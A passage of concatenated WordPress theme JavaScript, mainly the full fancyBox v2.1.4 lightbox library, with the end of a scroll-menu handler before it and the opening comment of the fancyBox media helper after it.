        function scrollHandler() {
            menuListen();
            menuFreeze();
        }
        scrollHandler();
        viewport.on('scroll', function() {
            scrollHandler();
        });
    }
});
// source --> https://kendrew.ca/wp-content/themes/logipro/scripts/fancybox/jquery.fancybox.pack.js
/*! fancyBox v2.1.4 fancyapps.com | fancyapps.com/fancybox/#license */
(function(C, z, f, r) {
    var q = f(C),
        n = f(z),
        b = f.fancybox = function() {
            b.open.apply(this, arguments)
        },
        H = navigator.userAgent.match(/msie/),
        w = null,
        s = z.createTouch !== r,
        t = function(a) {
            return a && a.hasOwnProperty && a instanceof f
        },
        p = function(a) {
            return a && "string" === f.type(a)
        },
        F = function(a) {
            return p(a) && 0 < a.indexOf("%")
        },
        l = function(a, d) {
            var e = parseInt(a, 10) || 0;
            d && F(a) && (e *= b.getViewport()[d] / 100);
            return Math.ceil(e)
        },
        x = function(a, b) {
            return l(a, b) + "px"
        };
    f.extend(b, {
        version: "2.1.4",
        defaults: {
            padding: 15,
            margin: 20,
            width: 800,
            height: 600,
            minWidth: 100,
            minHeight: 100,
            maxWidth: 9999,
            maxHeight: 9999,
            autoSize: !0,
            autoHeight: !1,
            autoWidth: !1,
            autoResize: !0,
            autoCenter: !s,
            fitToView: !0,
            aspectRatio: !1,
            topRatio: 0.5,
            leftRatio: 0.5,
            scrolling: "auto",
            wrapCSS: "",
            arrows: !0,
            closeBtn: !0,
            closeClick: !1,
            nextClick: !1,
            mouseWheel: !0,
            autoPlay: !1,
            playSpeed: 3E3,
            preload: 3,
            modal: !1,
            loop: !0,
            ajax: {
                dataType: "html",
                headers: {
                    "X-fancyBox": !0
                }
            },
            iframe: {
                scrolling: "auto",
                preload: !0
            },
            swf: {
                wmode: "transparent",
                allowfullscreen: "true",
                allowscriptaccess: "always"
            },
            keys: {
                next: {
                    13: "left",
                    34: "up",
                    39: "left",
                    40: "up"
                },
                prev: {
                    8: "right",
                    33: "down",
                    37: "right",
                    38: "down"
                },
                close: [27],
                play: [32],
                toggle: [70]
            },
            direction: {
                next: "left",
                prev: "right"
            },
            scrollOutside: !0,
            index: 0,
            type: null,
            href: null,
            content: null,
            title: null,
            tpl: {
                wrap: '<div class="fancybox-wrap" tabIndex="-1"><div class="fancybox-skin"><div class="fancybox-outer"><div class="fancybox-inner"></div></div></div></div>',
                image: '<img class="fancybox-image" src="{href}" alt="" />',
                iframe: '<iframe id="fancybox-frame{rnd}" name="fancybox-frame{rnd}" class="fancybox-iframe" frameborder="0" vspace="0" hspace="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen' +
                    (H ? ' allowtransparency="true"' : "") + "></iframe>",
                error: '<p class="fancybox-error">The requested content cannot be loaded.<br/>Please try again later.</p>',
                closeBtn: '<a title="Close" class="fancybox-item fancybox-close" href="javascript:;"></a>',
                next: '<a title="Next" class="fancybox-nav fancybox-next" href="javascript:;"><span></span></a>',
                prev: '<a title="Previous" class="fancybox-nav fancybox-prev" href="javascript:;"><span></span></a>'
            },
            openEffect: "fade",
            openSpeed: 250,
            openEasing: "swing",
            openOpacity: !0,
            openMethod: "zoomIn",
            closeEffect: "fade",
            closeSpeed: 250,
            closeEasing: "swing",
            closeOpacity: !0,
            closeMethod: "zoomOut",
            nextEffect: "elastic",
            nextSpeed: 250,
            nextEasing: "swing",
            nextMethod: "changeIn",
            prevEffect: "elastic",
            prevSpeed: 250,
            prevEasing: "swing",
            prevMethod: "changeOut",
            helpers: {
                overlay: !0,
                title: !0
            },
            onCancel: f.noop,
            beforeLoad: f.noop,
            afterLoad: f.noop,
            beforeShow: f.noop,
            afterShow: f.noop,
            beforeChange: f.noop,
            beforeClose: f.noop,
            afterClose: f.noop
        },
        group: {},
        opts: {},
        previous: null,
        coming: null,
        current: null,
        isActive: !1,
        isOpen: !1,
        isOpened: !1,
        wrap: null,
        skin: null,
        outer: null,
        inner: null,
        player: {
            timer: null,
            isActive: !1
        },
        ajaxLoad: null,
        imgPreload: null,
        transitions: {},
        helpers: {},
        open: function(a, d) {
            if (a && (f.isPlainObject(d) || (d = {}), !1 !== b.close(!0))) return f.isArray(a) || (a = t(a) ? f(a).get() : [a]), f.each(a, function(e, c) {
                var k = {},
                    g, h, j, m, l;
                "object" === f.type(c) && (c.nodeType && (c = f(c)), t(c) ? (k = {
                    href: c.data("fancybox-href") || c.attr("href"),
                    title: c.data("fancybox-title") || c.attr("title"),
                    isDom: !0,
                    element: c
                }, f.metadata && f.extend(!0, k,
                    c.metadata())) : k = c);
                g = d.href || k.href || (p(c) ? c : null);
                h = d.title !== r ? d.title : k.title || "";
                m = (j = d.content || k.content) ? "html" : d.type || k.type;
                !m && k.isDom && (m = c.data("fancybox-type"), m || (m = (m = c.prop("class").match(/fancybox\.(\w+)/)) ? m[1] : null));
                p(g) && (m || (b.isImage(g) ? m = "image" : b.isSWF(g) ? m = "swf" : "#" === g.charAt(0) ? m = "inline" : p(c) && (m = "html", j = c)), "ajax" === m && (l = g.split(/\s+/, 2), g = l.shift(), l = l.shift()));
                j || ("inline" === m ? g ? j = f(p(g) ? g.replace(/.*(?=#[^\s]+$)/, "") : g) : k.isDom && (j = c) : "html" === m ? j = g : !m && (!g &&
                    k.isDom) && (m = "inline", j = c));
                f.extend(k, {
                    href: g,
                    type: m,
                    content: j,
                    title: h,
                    selector: l
                });
                a[e] = k
            }), b.opts = f.extend(!0, {}, b.defaults, d), d.keys !== r && (b.opts.keys = d.keys ? f.extend({}, b.defaults.keys, d.keys) : !1), b.group = a, b._start(b.opts.index)
        },
        cancel: function() {
            var a = b.coming;
            a && !1 !== b.trigger("onCancel") && (b.hideLoading(), b.ajaxLoad && b.ajaxLoad.abort(), b.ajaxLoad = null, b.imgPreload && (b.imgPreload.onload = b.imgPreload.onerror = null), a.wrap && a.wrap.stop(!0, !0).trigger("onReset").remove(), b.coming = null, b.current ||
            b._afterZoomOut(a))
        },
        close: function(a) {
            b.cancel();
            !1 !== b.trigger("beforeClose") && (b.unbindEvents(), b.isActive && (!b.isOpen || !0 === a ? (f(".fancybox-wrap").stop(!0).trigger("onReset").remove(), b._afterZoomOut()) : (b.isOpen = b.isOpened = !1, b.isClosing = !0, f(".fancybox-item, .fancybox-nav").remove(), b.wrap.stop(!0, !0).removeClass("fancybox-opened"), b.transitions[b.current.closeMethod]())))
        },
        play: function(a) {
            var d = function() {
                    clearTimeout(b.player.timer)
                },
                e = function() {
                    d();
                    b.current && b.player.isActive && (b.player.timer =
                        setTimeout(b.next, b.current.playSpeed))
                },
                c = function() {
                    d();
                    f("body").unbind(".player");
                    b.player.isActive = !1;
                    b.trigger("onPlayEnd")
                };
            if (!0 === a || !b.player.isActive && !1 !== a) {
                if (b.current && (b.current.loop || b.current.index < b.group.length - 1)) b.player.isActive = !0, f("body").bind({
                    "afterShow.player onUpdate.player": e,
                    "onCancel.player beforeClose.player": c,
                    "beforeLoad.player": d
                }), e(), b.trigger("onPlayStart")
            } else c()
        },
        next: function(a) {
            var d = b.current;
            d && (p(a) || (a = d.direction.next), b.jumpto(d.index + 1, a, "next"))
        },
        prev: function(a) {
            var d = b.current;
            d && (p(a) || (a = d.direction.prev), b.jumpto(d.index - 1, a, "prev"))
        },
        jumpto: function(a, d, e) {
            var c = b.current;
            c && (a = l(a), b.direction = d || c.direction[a >= c.index ? "next" : "prev"], b.router = e || "jumpto", c.loop && (0 > a && (a = c.group.length + a % c.group.length), a %= c.group.length), c.group[a] !== r && (b.cancel(), b._start(a)))
        },
        reposition: function(a, d) {
            var e = b.current,
                c = e ? e.wrap : null,
                k;
            c && (k = b._getPosition(d), a && "scroll" === a.type ? (delete k.position, c.stop(!0, !0).animate(k, 200)) : (c.css(k), e.pos = f.extend({},
                e.dim, k)))
        },
        update: function(a) {
            var d = a && a.type,
                e = !d || "orientationchange" === d;
            e && (clearTimeout(w), w = null);
            b.isOpen && !w && (w = setTimeout(function() {
                var c = b.current;
                c && !b.isClosing && (b.wrap.removeClass("fancybox-tmp"), (e || "load" === d || "resize" === d && c.autoResize) && b._setDimension(), "scroll" === d && c.canShrink || b.reposition(a), b.trigger("onUpdate"), w = null)
            }, e && !s ? 0 : 300))
        },
        toggle: function(a) {
            b.isOpen && (b.current.fitToView = "boolean" === f.type(a) ? a : !b.current.fitToView, s && (b.wrap.removeAttr("style").addClass("fancybox-tmp"),
                b.trigger("onUpdate")), b.update())
        },
        hideLoading: function() {
            n.unbind(".loading");
            f("#fancybox-loading").remove()
        },
        showLoading: function() {
            var a, d;
            b.hideLoading();
            a = f('<div id="fancybox-loading"><div></div></div>').click(b.cancel).appendTo("body");
            n.bind("keydown.loading", function(a) {
                if (27 === (a.which || a.keyCode)) a.preventDefault(), b.cancel()
            });
            b.defaults.fixed || (d = b.getViewport(), a.css({
                position: "absolute",
                top: 0.5 * d.h + d.y,
                left: 0.5 * d.w + d.x
            }))
        },
        getViewport: function() {
            var a = b.current && b.current.locked ||
                !1,
                d = {
                    x: q.scrollLeft(),
                    y: q.scrollTop()
                };
            a ? (d.w = a[0].clientWidth, d.h = a[0].clientHeight) : (d.w = s && C.innerWidth ? C.innerWidth : q.width(), d.h = s && C.innerHeight ? C.innerHeight : q.height());
            return d
        },
        unbindEvents: function() {
            b.wrap && t(b.wrap) && b.wrap.unbind(".fb");
            n.unbind(".fb");
            q.unbind(".fb")
        },
        bindEvents: function() {
            var a = b.current,
                d;
            a && (q.bind("orientationchange.fb" + (s ? "" : " resize.fb") + (a.autoCenter && !a.locked ? " scroll.fb" : ""), b.update), (d = a.keys) && n.bind("keydown.fb", function(e) {
                var c = e.which || e.keyCode,
                    k =
                        e.target || e.srcElement;
                if (27 === c && b.coming) return !1;
                !e.ctrlKey && (!e.altKey && !e.shiftKey && !e.metaKey && (!k || !k.type && !f(k).is("[contenteditable]"))) && f.each(d, function(d, k) {
                    if (1 < a.group.length && k[c] !== r) return b[d](k[c]), e.preventDefault(), !1;
                    if (-1 < f.inArray(c, k)) return b[d](), e.preventDefault(), !1
                })
            }), f.fn.mousewheel && a.mouseWheel && b.wrap.bind("mousewheel.fb", function(d, c, k, g) {
                for (var h = f(d.target || null), j = !1; h.length && !j && !h.is(".fancybox-skin") && !h.is(".fancybox-wrap");) j = h[0] && !(h[0].style.overflow &&
                    "hidden" === h[0].style.overflow) && (h[0].clientWidth && h[0].scrollWidth > h[0].clientWidth || h[0].clientHeight && h[0].scrollHeight > h[0].clientHeight), h = f(h).parent();
                if (0 !== c && !j && 1 < b.group.length && !a.canShrink) {
                    if (0 < g || 0 < k) b.prev(0 < g ? "down" : "left");
                    else if (0 > g || 0 > k) b.next(0 > g ? "up" : "right");
                    d.preventDefault()
                }
            }))
        },
        trigger: function(a, d) {
            var e, c = d || b.coming || b.current;
            if (c) {
                f.isFunction(c[a]) && (e = c[a].apply(c, Array.prototype.slice.call(arguments, 1)));
                if (!1 === e) return !1;
                c.helpers && f.each(c.helpers, function(d,
                                                        e) {
                    e && (b.helpers[d] && f.isFunction(b.helpers[d][a])) && (e = f.extend(!0, {}, b.helpers[d].defaults, e), b.helpers[d][a](e, c))
                });
                f.event.trigger(a + ".fb")
            }
        },
        isImage: function(a) {
            return p(a) && a.match(/(^data:image\/.*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp)((\?|#).*)?$)/i)
        },
        isSWF: function(a) {
            return p(a) && a.match(/\.(swf)((\?|#).*)?$/i)
        },
        _start: function(a) {
            var d = {},
                e, c;
            a = l(a);
            e = b.group[a] || null;
            if (!e) return !1;
            d = f.extend(!0, {}, b.opts, e);
            e = d.margin;
            c = d.padding;
            "number" === f.type(e) && (d.margin = [e, e, e, e]);
            "number" === f.type(c) &&
            (d.padding = [c, c, c, c]);
            d.modal && f.extend(!0, d, {
                closeBtn: !1,
                closeClick: !1,
                nextClick: !1,
                arrows: !1,
                mouseWheel: !1,
                keys: null,
                helpers: {
                    overlay: {
                        closeClick: !1
                    }
                }
            });
            d.autoSize && (d.autoWidth = d.autoHeight = !0);
            "auto" === d.width && (d.autoWidth = !0);
            "auto" === d.height && (d.autoHeight = !0);
            d.group = b.group;
            d.index = a;
            b.coming = d;
            if (!1 === b.trigger("beforeLoad")) b.coming = null;
            else {
                c = d.type;
                e = d.href;
                if (!c) return b.coming = null, b.current && b.router && "jumpto" !== b.router ? (b.current.index = a, b[b.router](b.direction)) : !1;
                b.isActive = !0;
                if ("image" === c || "swf" === c) d.autoHeight = d.autoWidth = !1, d.scrolling = "visible";
                "image" === c && (d.aspectRatio = !0);
                "iframe" === c && s && (d.scrolling = "scroll");
                d.wrap = f(d.tpl.wrap).addClass("fancybox-" + (s ? "mobile" : "desktop") + " fancybox-type-" + c + " fancybox-tmp " + d.wrapCSS).appendTo(d.parent || "body");
                f.extend(d, {
                    skin: f(".fancybox-skin", d.wrap),
                    outer: f(".fancybox-outer", d.wrap),
                    inner: f(".fancybox-inner", d.wrap)
                });
                f.each(["Top", "Right", "Bottom", "Left"], function(a, b) {
                    d.skin.css("padding" + b, x(d.padding[a]))
                });
                b.trigger("onReady");
                if ("inline" === c || "html" === c) {
                    if (!d.content || !d.content.length) return b._error("content")
                } else if (!e) return b._error("href");
                "image" === c ? b._loadImage() : "ajax" === c ? b._loadAjax() : "iframe" === c ? b._loadIframe() : b._afterLoad()
            }
        },
        _error: function(a) {
            f.extend(b.coming, {
                type: "html",
                autoWidth: !0,
                autoHeight: !0,
                minWidth: 0,
                minHeight: 0,
                scrolling: "no",
                hasError: a,
                content: b.coming.tpl.error
            });
            b._afterLoad()
        },
        _loadImage: function() {
            var a = b.imgPreload = new Image;
            a.onload = function() {
                this.onload = this.onerror = null;
                b.coming.width =
                    this.width;
                b.coming.height = this.height;
                b._afterLoad()
            };
            a.onerror = function() {
                this.onload = this.onerror = null;
                b._error("image")
            };
            a.src = b.coming.href;
            !0 !== a.complete && b.showLoading()
        },
        _loadAjax: function() {
            var a = b.coming;
            b.showLoading();
            b.ajaxLoad = f.ajax(f.extend({}, a.ajax, {
                url: a.href,
                error: function(a, e) {
                    b.coming && "abort" !== e ? b._error("ajax", a) : b.hideLoading()
                },
                success: function(d, e) {
                    "success" === e && (a.content = d, b._afterLoad())
                }
            }))
        },
        _loadIframe: function() {
            var a = b.coming,
                d = f(a.tpl.iframe.replace(/\{rnd\}/g, (new Date).getTime())).attr("scrolling", s ? "auto" : a.iframe.scrolling).attr("src", a.href);
            f(a.wrap).bind("onReset", function() {
                try {
                    f(this).find("iframe").hide().attr("src", "//about:blank").end().empty()
                } catch (a) {}
            });
            a.iframe.preload && (b.showLoading(), d.one("load", function() {
                f(this).data("ready", 1);
                s || f(this).bind("load.fb", b.update);
                f(this).parents(".fancybox-wrap").width("100%").removeClass("fancybox-tmp").show();
                b._afterLoad()
            }));
            a.content = d.appendTo(a.inner);
            a.iframe.preload || b._afterLoad()
        },
        _preloadImages: function() {
            var a =
                    b.group,
                d = b.current,
                e = a.length,
                c = d.preload ? Math.min(d.preload, e - 1) : 0,
                f, g;
            for (g = 1; g <= c; g += 1) f = a[(d.index + g) % e], "image" === f.type && f.href && ((new Image).src = f.href)
        },
        _afterLoad: function() {
            var a = b.coming,
                d = b.current,
                e, c, k, g, h;
            b.hideLoading();
            if (a && !1 !== b.isActive)
                if (!1 === b.trigger("afterLoad", a, d)) a.wrap.stop(!0).trigger("onReset").remove(), b.coming = null;
                else {
                    d && (b.trigger("beforeChange", d), d.wrap.stop(!0).removeClass("fancybox-opened").find(".fancybox-item, .fancybox-nav").remove());
                    b.unbindEvents();
                    e = a.content;
                    c = a.type;
                    k = a.scrolling;
                    f.extend(b, {
                        wrap: a.wrap,
                        skin: a.skin,
                        outer: a.outer,
                        inner: a.inner,
                        current: a,
                        previous: d
                    });
                    g = a.href;
                    switch (c) {
                        case "inline":
                        case "ajax":
                        case "html":
                            a.selector ? e = f("<div>").html(e).find(a.selector) : t(e) && (e.data("fancybox-placeholder") || e.data("fancybox-placeholder", f('<div class="fancybox-placeholder"></div>').insertAfter(e).hide()), e = e.show().detach(), a.wrap.bind("onReset", function() {
                                f(this).find(e).length && e.hide().replaceAll(e.data("fancybox-placeholder")).data("fancybox-placeholder", !1)
                            }));
                            break;
                        case "image":
                            e = a.tpl.image.replace("{href}", g);
                            break;
                        case "swf":
                            e = '<object id="fancybox-swf" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%"><param name="movie" value="' + g + '"></param>', h = "", f.each(a.swf, function(a, b) {
                                e += '<param name="' + a + '" value="' + b + '"></param>';
                                h += " " + a + '="' + b + '"'
                            }), e += '<embed src="' + g + '" type="application/x-shockwave-flash" width="100%" height="100%"' + h + "></embed></object>"
                    }(!t(e) || !e.parent().is(a.inner)) && a.inner.append(e);
                    b.trigger("beforeShow");
                    a.inner.css("overflow", "yes" === k ? "scroll" : "no" === k ? "hidden" : k);
                    b._setDimension();
                    b.reposition();
                    b.isOpen = !1;
                    b.coming = null;
                    b.bindEvents();
                    if (b.isOpened) {
                        if (d.prevMethod) b.transitions[d.prevMethod]()
                    } else f(".fancybox-wrap").not(a.wrap).stop(!0).trigger("onReset").remove();
                    b.transitions[b.isOpened ? a.nextMethod : a.openMethod]();
                    b._preloadImages()
                }
        },
        _setDimension: function() {
            var a = b.getViewport(),
                d = 0,
                e = !1,
                c = !1,
                e = b.wrap,
                k = b.skin,
                g = b.inner,
                h = b.current,
                c = h.width,
                j = h.height,
                m = h.minWidth,
                u = h.minHeight,
                n = h.maxWidth,
                v = h.maxHeight,
                s = h.scrolling,
                q = h.scrollOutside ? h.scrollbarWidth : 0,
                y = h.margin,
                p = l(y[1] + y[3]),
                r = l(y[0] + y[2]),
                z, A, t, D, B, G, C, E, w;
            e.add(k).add(g).width("auto").height("auto").removeClass("fancybox-tmp");
            y = l(k.outerWidth(!0) - k.width());
            z = l(k.outerHeight(!0) - k.height());
            A = p + y;
            t = r + z;
            D = F(c) ? (a.w - A) * l(c) / 100 : c;
            B = F(j) ? (a.h - t) * l(j) / 100 : j;
            if ("iframe" === h.type) {
                if (w = h.content, h.autoHeight && 1 === w.data("ready")) try {
                    w[0].contentWindow.document.location && (g.width(D).height(9999), G = w.contents().find("body"), q && G.css("overflow-x",
                        "hidden"), B = G.height())
                } catch (H) {}
            } else if (h.autoWidth || h.autoHeight) g.addClass("fancybox-tmp"), h.autoWidth || g.width(D), h.autoHeight || g.height(B), h.autoWidth && (D = g.width()), h.autoHeight && (B = g.height()), g.removeClass("fancybox-tmp");
            c = l(D);
            j = l(B);
            E = D / B;
            m = l(F(m) ? l(m, "w") - A : m);
            n = l(F(n) ? l(n, "w") - A : n);
            u = l(F(u) ? l(u, "h") - t : u);
            v = l(F(v) ? l(v, "h") - t : v);
            G = n;
            C = v;
            h.fitToView && (n = Math.min(a.w - A, n), v = Math.min(a.h - t, v));
            A = a.w - p;
            r = a.h - r;
            h.aspectRatio ? (c > n && (c = n, j = l(c / E)), j > v && (j = v, c = l(j * E)), c < m && (c = m, j = l(c / E)), j < u &&
            (j = u, c = l(j * E))) : (c = Math.max(m, Math.min(c, n)), h.autoHeight && "iframe" !== h.type && (g.width(c), j = g.height()), j = Math.max(u, Math.min(j, v)));
            if (h.fitToView)
                if (g.width(c).height(j), e.width(c + y), a = e.width(), p = e.height(), h.aspectRatio)
                    for (;
                        (a > A || p > r) && (c > m && j > u) && !(19 < d++);) j = Math.max(u, Math.min(v, j - 10)), c = l(j * E), c < m && (c = m, j = l(c / E)), c > n && (c = n, j = l(c / E)), g.width(c).height(j), e.width(c + y), a = e.width(), p = e.height();
                else c = Math.max(m, Math.min(c, c - (a - A))), j = Math.max(u, Math.min(j, j - (p - r)));
            q && ("auto" === s && j < B && c + y +
                q < A) && (c += q);
            g.width(c).height(j);
            e.width(c + y);
            a = e.width();
            p = e.height();
            e = (a > A || p > r) && c > m && j > u;
            c = h.aspectRatio ? c < G && j < C && c < D && j < B : (c < G || j < C) && (c < D || j < B);
            f.extend(h, {
                dim: {
                    width: x(a),
                    height: x(p)
                },
                origWidth: D,
                origHeight: B,
                canShrink: e,
                canExpand: c,
                wPadding: y,
                hPadding: z,
                wrapSpace: p - k.outerHeight(!0),
                skinSpace: k.height() - j
            });
            !w && (h.autoHeight && j > u && j < v && !c) && g.height("auto")
        },
        _getPosition: function(a) {
            var d = b.current,
                e = b.getViewport(),
                c = d.margin,
                f = b.wrap.width() + c[1] + c[3],
                g = b.wrap.height() + c[0] + c[2],
                c = {
                    position: "absolute",
                    top: c[0],
                    left: c[3]
                };
            d.autoCenter && d.fixed && !a && g <= e.h && f <= e.w ? c.position = "fixed" : d.locked || (c.top += e.y, c.left += e.x);
            c.top = x(Math.max(c.top, c.top + (e.h - g) * d.topRatio));
            c.left = x(Math.max(c.left, c.left + (e.w - f) * d.leftRatio));
            return c
        },
        _afterZoomIn: function() {
            var a = b.current;
            a && (b.isOpen = b.isOpened = !0, b.wrap.css("overflow", "visible").addClass("fancybox-opened"), b.update(), (a.closeClick || a.nextClick && 1 < b.group.length) && b.inner.css("cursor", "pointer").bind("click.fb", function(d) {
                !f(d.target).is("a") && !f(d.target).parent().is("a") &&
                (d.preventDefault(), b[a.closeClick ? "close" : "next"]())
            }), a.closeBtn && f(a.tpl.closeBtn).appendTo(b.skin).bind("click.fb", function(a) {
                a.preventDefault();
                b.close()
            }), a.arrows && 1 < b.group.length && ((a.loop || 0 < a.index) && f(a.tpl.prev).appendTo(b.outer).bind("click.fb", b.prev), (a.loop || a.index < b.group.length - 1) && f(a.tpl.next).appendTo(b.outer).bind("click.fb", b.next)), b.trigger("afterShow"), !a.loop && a.index === a.group.length - 1 ? b.play(!1) : b.opts.autoPlay && !b.player.isActive && (b.opts.autoPlay = !1, b.play()))
        },
        _afterZoomOut: function(a) {
            a =
                a || b.current;
            f(".fancybox-wrap").trigger("onReset").remove();
            f.extend(b, {
                group: {},
                opts: {},
                router: !1,
                current: null,
                isActive: !1,
                isOpened: !1,
                isOpen: !1,
                isClosing: !1,
                wrap: null,
                skin: null,
                outer: null,
                inner: null
            });
            b.trigger("afterClose", a)
        }
    });
    b.transitions = {
        getOrigPosition: function() {
            var a = b.current,
                d = a.element,
                e = a.orig,
                c = {},
                f = 50,
                g = 50,
                h = a.hPadding,
                j = a.wPadding,
                m = b.getViewport();
            !e && (a.isDom && d.is(":visible")) && (e = d.find("img:first"), e.length || (e = d));
            t(e) ? (c = e.offset(), e.is("img") && (f = e.outerWidth(), g = e.outerHeight())) :
                (c.top = m.y + (m.h - g) * a.topRatio, c.left = m.x + (m.w - f) * a.leftRatio);
            if ("fixed" === b.wrap.css("position") || a.locked) c.top -= m.y, c.left -= m.x;
            return c = {
                top: x(c.top - h * a.topRatio),
                left: x(c.left - j * a.leftRatio),
                width: x(f + j),
                height: x(g + h)
            }
        },
        step: function(a, d) {
            var e, c, f = d.prop;
            c = b.current;
            var g = c.wrapSpace,
                h = c.skinSpace;
            if ("width" === f || "height" === f) e = d.end === d.start ? 1 : (a - d.start) / (d.end - d.start), b.isClosing && (e = 1 - e), c = "width" === f ? c.wPadding : c.hPadding, c = a - c, b.skin[f](l("width" === f ? c : c - g * e)), b.inner[f](l("width" ===
            f ? c : c - g * e - h * e))
        },
        zoomIn: function() {
            var a = b.current,
                d = a.pos,
                e = a.openEffect,
                c = "elastic" === e,
                k = f.extend({
                    opacity: 1
                }, d);
            delete k.position;
            c ? (d = this.getOrigPosition(), a.openOpacity && (d.opacity = 0.1)) : "fade" === e && (d.opacity = 0.1);
            b.wrap.css(d).animate(k, {
                duration: "none" === e ? 0 : a.openSpeed,
                easing: a.openEasing,
                step: c ? this.step : null,
                complete: b._afterZoomIn
            })
        },
        zoomOut: function() {
            var a = b.current,
                d = a.closeEffect,
                e = "elastic" === d,
                c = {
                    opacity: 0.1
                };
            e && (c = this.getOrigPosition(), a.closeOpacity && (c.opacity = 0.1));
            b.wrap.animate(c, {
                duration: "none" === d ? 0 : a.closeSpeed,
                easing: a.closeEasing,
                step: e ? this.step : null,
                complete: b._afterZoomOut
            })
        },
        changeIn: function() {
            var a = b.current,
                d = a.nextEffect,
                e = a.pos,
                c = {
                    opacity: 1
                },
                f = b.direction,
                g;
            e.opacity = 0.1;
            "elastic" === d && (g = "down" === f || "up" === f ? "top" : "left", "down" === f || "right" === f ? (e[g] = x(l(e[g]) - 200), c[g] = "+=200px") : (e[g] = x(l(e[g]) + 200), c[g] = "-=200px"));
            "none" === d ? b._afterZoomIn() : b.wrap.css(e).animate(c, {
                duration: a.nextSpeed,
                easing: a.nextEasing,
                complete: b._afterZoomIn
            })
        },
        changeOut: function() {
            var a =
                    b.previous,
                d = a.prevEffect,
                e = {
                    opacity: 0.1
                },
                c = b.direction;
            "elastic" === d && (e["down" === c || "up" === c ? "top" : "left"] = ("up" === c || "left" === c ? "-" : "+") + "=200px");
            a.wrap.animate(e, {
                duration: "none" === d ? 0 : a.prevSpeed,
                easing: a.prevEasing,
                complete: function() {
                    f(this).trigger("onReset").remove()
                }
            })
        }
    };
    b.helpers.overlay = {
        defaults: {
            closeClick: !0,
            speedOut: 200,
            showEarly: !0,
            css: {},
            locked: !s,
            fixed: !0
        },
        overlay: null,
        fixed: !1,
        create: function(a) {
            a = f.extend({}, this.defaults, a);
            this.overlay && this.close();
            this.overlay = f('<div class="fancybox-overlay"></div>').appendTo("body");
            this.fixed = !1;
            a.fixed && b.defaults.fixed && (this.overlay.addClass("fancybox-overlay-fixed"), this.fixed = !0)
        },
        open: function(a) {
            var d = this;
            a = f.extend({}, this.defaults, a);
            this.overlay ? this.overlay.unbind(".overlay").width("auto").height("auto") : this.create(a);
            this.fixed || (q.bind("resize.overlay", f.proxy(this.update, this)), this.update());
            a.closeClick && this.overlay.bind("click.overlay", function(a) {
                f(a.target).hasClass("fancybox-overlay") && (b.isActive ? b.close() : d.close())
            });
            this.overlay.css(a.css).show()
        },
        close: function() {
            f(".fancybox-overlay").remove();
            q.unbind("resize.overlay");
            this.overlay = null;
            !1 !== this.margin && (f("body").css("margin-right", this.margin), this.margin = !1);
            this.el && this.el.removeClass("fancybox-lock")
        },
        update: function() {
            var a = "100%",
                b;
            this.overlay.width(a).height("100%");
            H ? (b = Math.max(z.documentElement.offsetWidth, z.body.offsetWidth), n.width() > b && (a = n.width())) : n.width() > q.width() && (a = n.width());
            this.overlay.width(a).height(n.height())
        },
        onReady: function(a, b) {
            f(".fancybox-overlay").stop(!0, !0);
            this.overlay || (this.margin = n.height() > q.height() || "scroll" === f("body").css("overflow-y") ? f("body").css("margin-right") : !1, this.el = z.all && !z.querySelector ? f("html") : f("body"), this.create(a));
            a.locked && this.fixed && (b.locked = this.overlay.append(b.wrap), b.fixed = !1);
            !0 === a.showEarly && this.beforeShow.apply(this, arguments)
        },
        beforeShow: function(a, b) {
            b.locked && (this.el.addClass("fancybox-lock"), !1 !== this.margin && f("body").css("margin-right", l(this.margin) + b.scrollbarWidth));
            this.open(a)
        },
        onUpdate: function() {
            this.fixed ||
            this.update()
        },
        afterClose: function(a) {
            this.overlay && !b.isActive && this.overlay.fadeOut(a.speedOut, f.proxy(this.close, this))
        }
    };
    b.helpers.title = {
        defaults: {
            type: "float",
            position: "bottom"
        },
        beforeShow: function(a) {
            var d = b.current,
                e = d.title,
                c = a.type;
            f.isFunction(e) && (e = e.call(d.element, d));
            if (p(e) && "" !== f.trim(e)) {
                d = f('<div class="fancybox-title fancybox-title-' + c + '-wrap">' + e + "</div>");
                switch (c) {
                    case "inside":
                        c = b.skin;
                        break;
                    case "outside":
                        c = b.wrap;
                        break;
                    case "over":
                        c = b.inner;
                        break;
                    default:
                        c = b.skin, d.appendTo("body"),
                        H && d.width(d.width()), d.wrapInner('<span class="child"></span>'), b.current.margin[2] += Math.abs(l(d.css("margin-bottom")))
                }
                d["top" === a.position ? "prependTo" : "appendTo"](c)
            }
        }
    };
    f.fn.fancybox = function(a) {
        var d, e = f(this),
            c = this.selector || "",
            k = function(g) {
                var h = f(this).blur(),
                    j = d,
                    k, l;
                !g.ctrlKey && (!g.altKey && !g.shiftKey && !g.metaKey) && !h.is(".fancybox-wrap") && (k = a.groupAttr || "data-fancybox-group", l = h.attr(k), l || (k = "rel", l = h.get(0)[k]), l && ("" !== l && "nofollow" !== l) && (h = c.length ? f(c) : e, h = h.filter("[" + k + '="' + l +
                    '"]'), j = h.index(this)), a.index = j, !1 !== b.open(h, a) && g.preventDefault())
            };
        a = a || {};
        d = a.index || 0;
        !c || !1 === a.live ? e.unbind("click.fb-start").bind("click.fb-start", k) : n.undelegate(c, "click.fb-start").delegate(c + ":not('.fancybox-item, .fancybox-nav')", "click.fb-start", k);
        this.filter("[data-fancybox-start=1]").trigger("click");
        return this
    };
    n.ready(function() {
        f.scrollbarWidth === r && (f.scrollbarWidth = function() {
            var a = f('<div style="width:50px;height:50px;overflow:auto"><div/></div>').appendTo("body"),
                b = a.children(),
                b = b.innerWidth() - b.height(99).innerWidth();
            a.remove();
            return b
        });
        if (f.support.fixedPosition === r) {
            var a = f.support,
                d = f('<div style="position:fixed;top:20px;"></div>').appendTo("body"),
                e = 20 === d[0].offsetTop || 15 === d[0].offsetTop;
            d.remove();
            a.fixedPosition = e
        }
        f.extend(b.defaults, {
            scrollbarWidth: f.scrollbarWidth(),
            fixed: f.support.fixedPosition,
            parent: f("body")
        })
    })
})(window, document, jQuery);
// source --> https://kendrew.ca/wp-content/themes/logipro/scripts/fancybox/helpers/jquery.fancybox-media.js
/*!
 * Media helper for fancyBox
 * version: 1.0.5 (Tue, 23 Oct 2012)
 * @requires fancyBox v2.0 or later
 *
 * Usage:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             media: true
 *         }
 *     });
 *
 * Set custom URL parameters:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             media: {
 *                 youtube : {
